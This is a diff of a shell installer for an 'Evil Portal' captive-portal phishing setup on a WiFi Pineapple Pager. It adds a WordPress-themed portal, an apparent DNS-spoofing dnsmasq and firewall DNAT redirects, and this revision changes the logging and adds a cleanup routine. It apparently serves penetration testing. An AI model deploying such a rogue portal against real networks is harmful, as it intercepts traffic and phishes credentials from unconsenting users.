@@ -2,44 +2,44 @@
 # Name: Install Evil Portal on Pager
 # Description: Complete Evil Portal installation for WiFi Pineapple Pager (OpenWrt 24.10.1)
 # Author: PentestPlaybook
-# Version: 1.0
+# Version: 1.1
 # Category: Evil Portal
 
-ALERT "Starting Evil Portal installation for WiFi Pineapple Pager..."
+LOG "Starting Evil Portal installation for WiFi Pineapple Pager..."
 
 # ====================================================================
 # STEP 1: Install Required Packages
 # ====================================================================
-ALERT "Step 1: Installing required packages..."
-ALERT "Updating package lists..."
+LOG "Step 1: Installing required packages..."
+LOG "Updating package lists..."
 opkg update
 
-ALERT "Installing PHP 8 and modules..."
+LOG "Installing PHP 8 and modules..."
 opkg install php8 php8-fpm php8-mod-curl php8-mod-sqlite3
 
-ALERT "Installing nginx and dependencies..."
+LOG "Installing nginx and dependencies..."
 opkg install nginx-full nginx-ssl-util zoneinfo-core
 
-ALERT "Verifying package installation..."
+LOG "Verifying package installation..."
 if ! opkg list-installed | grep -q "php8-fpm"; then
-    ALERT "ERROR: PHP8-FPM installation failed"
+    LOG "ERROR: PHP8-FPM installation failed"
     exit 1
 fi
 
 if ! opkg list-installed | grep -q "nginx-full"; then
-    ALERT "ERROR: nginx-full installation failed"
+    LOG "ERROR: nginx-full installation failed"
     exit 1
 fi
 
-ALERT "SUCCESS: All packages installed"
+LOG "SUCCESS: All packages installed"
 
 # ====================================================================
 # STEP 2: Create Evil Portal API Files
 # ====================================================================
-ALERT "Step 2: Creating Evil Portal API backend..."
+LOG "Step 2: Creating Evil Portal API backend..."
 mkdir -p /pineapple/ui/modules/evilportal/assets/api
 
-ALERT "Creating index.php..."
+LOG "Creating index.php..."
 cat > /pineapple/ui/modules/evilportal/assets/api/index.php << 'EOF'
 <?php namespace evilportal;
 
@@ -53,7 +53,7 @@ $api = new API();
 echo $api->go();
 EOF
 
-ALERT "Creating API.php..."
+LOG "Creating API.php..."
 cat > /pineapple/ui/modules/evilportal/assets/api/API.php << 'EOF'
 <?php namespace evilportal;
 
@@ -107,7 +107,7 @@ class API
 }
 EOF
 
-ALERT "Creating Portal.php..."
+LOG "Creating Portal.php..."
 cat > /pineapple/ui/modules/evilportal/assets/api/Portal.php << 'EOF'
 <?php namespace evilportal;
 
@@ -201,15 +201,15 @@ abstract class Portal
 }
 EOF
 
-ALERT "SUCCESS: API files created"
+LOG "SUCCESS: API files created"
 
 # ====================================================================
 # STEP 3: Create Portal Files
 # ====================================================================
-ALERT "Step 3: Creating portal interface files..."
+LOG "Step 3: Creating portal interface files..."
 mkdir -p /root/portals/Wordpress
 
-ALERT "Creating index.php..."
+LOG "Creating index.php..."
 cat > /root/portals/Wordpress/index.php << 'EOF'
 <?php
 
@@ -252,7 +252,7 @@ require_once('helper.php');
 </HTML>
 EOF
 
-ALERT "Creating MyPortal.php..."
+LOG "Creating MyPortal.php..."
 cat > /root/portals/Wordpress/MyPortal.php << 'EOF'
 <?php namespace evilportal;
 
@@ -281,7 +281,7 @@ class MyPortal extends Portal
 }
 EOF
 
-ALERT "Creating helper.php..."
+LOG "Creating helper.php..."
 cat > /root/portals/Wordpress/helper.php << 'EOF'
 <?php
 
@@ -315,7 +315,7 @@ function getClientHostName($clientIP)
 }
 EOF
 
-ALERT "Creating Wordpress.ep..."
+LOG "Creating Wordpress.ep..."
 cat > /root/portals/Wordpress/Wordpress.ep << 'EOF'
 {
   "name": "Wordpress",
@@ -323,12 +323,12 @@ cat > /root/portals/Wordpress/Wordpress.ep << 'EOF'
 }
 EOF
 
-ALERT "SUCCESS: Portal files created"
+LOG "SUCCESS: Portal files created"
 
 # ====================================================================
 # STEP 4: Configure nginx
 # ====================================================================
-ALERT "Step 4: Configuring nginx web server..."
+LOG "Step 4: Configuring nginx web server..."
 cat > /etc/nginx/nginx.conf << 'EOF'
 user root root;
 worker_processes  1;
@@ -382,31 +382,31 @@ http {
 }
 EOF
 
-ALERT "Testing nginx configuration..."
+LOG "Testing nginx configuration..."
 nginx -t
 if [ $? -ne 0 ]; then
-    ALERT "ERROR: nginx configuration test failed"
+    LOG "ERROR: nginx configuration test failed"
     exit 1
 fi
 
-ALERT "SUCCESS: nginx configured"
+LOG "SUCCESS: nginx configured"
 
 # ====================================================================
 # STEP 5: Disable UCI nginx and Fix Permissions
 # ====================================================================
-ALERT "Step 5: Disabling UCI nginx and setting permissions..."
+LOG "Step 5: Disabling UCI nginx and setting permissions..."
 uci set nginx.global.uci_enable=false
 uci commit nginx
 
 chmod 755 /root
 chmod -R 755 /root/portals/
 
-ALERT "SUCCESS: Permissions configured"
+LOG "SUCCESS: Permissions configured"
 
 # ====================================================================
 # STEP 6: Create Init Script and Whitelist Daemon
 # ====================================================================
-ALERT "Step 6: Creating Evil Portal init script..."
+LOG "Step 6: Creating Evil Portal init script..."
 cat > /etc/init.d/evilportal << 'EOF'
 #!/bin/sh /etc/rc.common
 
@@ -457,13 +457,33 @@ restart() {
 }
 
 disable() {
+    # Stop services first
+    stop
+    
+    # Remove boot symlink
     rm -f /etc/rc.d/*evilportal
+    
+    # Remove firewall NAT rules - delete from highest index to lowest
+    while uci show firewall | grep -q "Evil Portal"; do
+        # Get the last (highest index) redirect rule containing "Evil Portal"
+        LAST_INDEX=$(uci show firewall | grep "redirect\[" | grep "Evil Portal" | tail -n1 | sed 's/.*redirect\[\([0-9]*\)\].*/\1/')
+        if [ -n "$LAST_INDEX" ]; then
+            uci delete firewall.@redirect[$LAST_INDEX]
+        else
+            break
+        fi
+    done
+    
+    uci commit firewall
+    /etc/init.d/firewall restart
+    
+    logger -t evilportal "Evil Portal disabled and cleaned up"
 }
 EOF
 
 chmod +x /etc/init.d/evilportal
 
-ALERT "Creating whitelist daemon..."
+LOG "Creating whitelist daemon..."
 cat > /usr/bin/evilportal-whitelist-daemon << 'EOF'
 #!/bin/sh
 
@@ -493,12 +513,12 @@ EOF
 
 chmod +x /usr/bin/evilportal-whitelist-daemon
 
-ALERT "SUCCESS: Init script and daemon created"
+LOG "SUCCESS: Init script and daemon created"
 
 # ====================================================================
 # STEP 7: Configure Firewall NAT Rules
 # ====================================================================
-ALERT "Step 7: Configuring firewall NAT rules..."
+LOG "Step 7: Configuring firewall NAT rules..."
 
 uci add firewall redirect
 uci set firewall.@redirect[-1].name='Evil Portal HTTPS'
@@ -538,111 +558,112 @@ uci set firewall.@redirect[-1].target='DNAT'
 
 uci commit firewall
 
-ALERT "Restarting firewall..."
+LOG "Restarting firewall..."
 /etc/init.d/firewall restart
 
-ALERT "SUCCESS: Firewall rules configured"
+LOG "SUCCESS: Firewall rules configured"
 
 # ====================================================================
 # STEP 8: Start Services
 # ====================================================================
-ALERT "Step 8: Starting Evil Portal services..."
+LOG "Step 8: Starting Evil Portal services..."
 
 /etc/init.d/php8-fpm restart
 /etc/init.d/nginx restart
 
-ALERT "Waiting for services to start..."
+LOG "Waiting for services to start..."
 sleep 3
 
 # Verify services are running
 if ! pgrep php8-fpm > /dev/null; then
-    ALERT "ERROR: PHP8-FPM failed to start"
+    LOG "ERROR: PHP8-FPM failed to start"
     exit 1
 fi
 
 if ! pgrep nginx > /dev/null; then
-    ALERT "ERROR: nginx failed to start"
+    LOG "ERROR: nginx failed to start"
     exit 1
 fi
 
-ALERT "Starting Evil Portal..."
+LOG "Starting Evil Portal..."
 /etc/init.d/evilportal start
 
-ALERT "Waiting for Evil Portal to start..."
+LOG "Waiting for Evil Portal to start..."
 sleep 3
 
 # Verify Evil Portal components
 if ! pgrep -f "evilportal-whitelist-daemon" > /dev/null; then
-    ALERT "WARNING: Whitelist daemon not running"
+    LOG "WARNING: Whitelist daemon not running"
 fi
 
 if ! pgrep -f "dnsmasq.*5353" > /dev/null; then
-    ALERT "WARNING: DNS spoof daemon not running"
+    LOG "WARNING: DNS spoof daemon not running"
 fi
 
 # ====================================================================
 # STEP 9: Enable at Boot
 # ====================================================================
-ALERT "Step 9: Enabling Evil Portal at boot..."
+LOG "Step 9: Enabling Evil Portal at boot..."
 ln -sf /etc/init.d/evilportal /etc/rc.d/S99evilportal
 
 if [ -L "/etc/rc.d/S99evilportal" ]; then
-    ALERT "SUCCESS: Evil Portal enabled at boot"
+    LOG "SUCCESS: Evil Portal enabled at boot"
 else
-    ALERT "WARNING: Failed to create boot symlink"
+    LOG "WARNING: Failed to create boot symlink"
 fi
 
 # ====================================================================
 # STEP 10: Verification
 # ====================================================================
-ALERT "Step 10: Running verification tests..."
+LOG "Step 10: Running verification tests..."
 
 # Test portal HTTP response
-ALERT "Testing portal HTTP response..."
+LOG "Testing portal HTTP response..."
 if curl -s http://172.16.52.1/ | grep -q "Evil Portal"; then
-    ALERT "SUCCESS: Portal HTTP responding"
+    LOG "SUCCESS: Portal HTTP responding"
 else
-    ALERT "WARNING: Portal HTTP not responding correctly"
+    LOG "WARNING: Portal HTTP not responding correctly"
 fi
 
 # Verify NAT rules exist
-ALERT "Verifying NAT rules..."
+LOG "Verifying NAT rules..."
 if nft list chain inet fw4 dstnat_lan | grep -q "Evil Portal"; then
-    ALERT "SUCCESS: NAT rules configured"
+    LOG "SUCCESS: NAT rules configured"
 else
-    ALERT "ERROR: NAT rules not found"
+    LOG "ERROR: NAT rules not found"
     exit 1
 fi
 
 # Verify symlinks
-ALERT "Verifying symlinks..."
+LOG "Verifying symlinks..."
 if [ -L "/www/index.php" ] && [ -L "/www/captiveportal" ]; then
-    ALERT "SUCCESS: Symlinks created"
+    LOG "SUCCESS: Symlinks created"
 else
-    ALERT "WARNING: Some symlinks may be missing"
+    LOG "WARNING: Some symlinks may be missing"
 fi
 
 # ====================================================================
 # Installation Complete
 # ====================================================================
-ALERT "===================================================="
-ALERT "Evil Portal Installation Complete!"
-ALERT "===================================================="
-ALERT "Portal URL: http://172.16.52.1/"
-ALERT "Services Status:"
-ALERT "  - PHP-FPM: $(pgrep php8-fpm > /dev/null && echo 'Running' || echo 'Stopped')"
-ALERT "  - nginx: $(pgrep nginx > /dev/null && echo 'Running' || echo 'Stopped')"
-ALERT "  - dnsmasq (5353): $(pgrep -f 'dnsmasq.*5353' > /dev/null && echo 'Running' || echo 'Stopped')"
-ALERT "  - Whitelist Daemon: $(pgrep -f evilportal-whitelist-daemon > /dev/null && echo 'Running' || echo 'Stopped')"
-ALERT ""
-ALERT "Portal files: /root/portals/Wordpress/"
-ALERT "API files: /pineapple/ui/modules/evilportal/assets/api/"
-ALERT "Init script: /etc/init.d/evilportal"
-ALERT ""
-ALERT "Management commands:"
-ALERT "  Start:   /etc/init.d/evilportal start"
-ALERT "  Stop:    /etc/init.d/evilportal stop"
-ALERT "  Restart: /etc/init.d/evilportal restart"
-ALERT "===================================================="
+LOG "===================================================="
+LOG "Evil Portal Installation Complete!"
+LOG "===================================================="
+LOG "Portal URL: http://172.16.52.1/"
+LOG "Services Status:"
+LOG "  - PHP-FPM: $(pgrep php8-fpm > /dev/null && echo 'Running' || echo 'Stopped')"
+LOG "  - nginx: $(pgrep nginx > /dev/null && echo 'Running' || echo 'Stopped')"
+LOG "  - dnsmasq (5353): $(pgrep -f 'dnsmasq.*5353' > /dev/null && echo 'Running' || echo 'Stopped')"
+LOG "  - Whitelist Daemon: $(pgrep -f evilportal-whitelist-daemon > /dev/null && echo 'Running' || echo 'Stopped')"
+LOG ""
+LOG "Portal files: /root/portals/Wordpress/"
+LOG "API files: /pineapple/ui/modules/evilportal/assets/api/"
+LOG "Init script: /etc/init.d/evilportal"
+LOG ""
+LOG "Management commands:"
+LOG "  Start:   /etc/init.d/evilportal start"
+LOG "  Stop:    /etc/init.d/evilportal stop"
+LOG "  Restart: /etc/init.d/evilportal restart"
+LOG "  Disable: /etc/init.d/evilportal disable"
+LOG "===================================================="
 
 exit 0
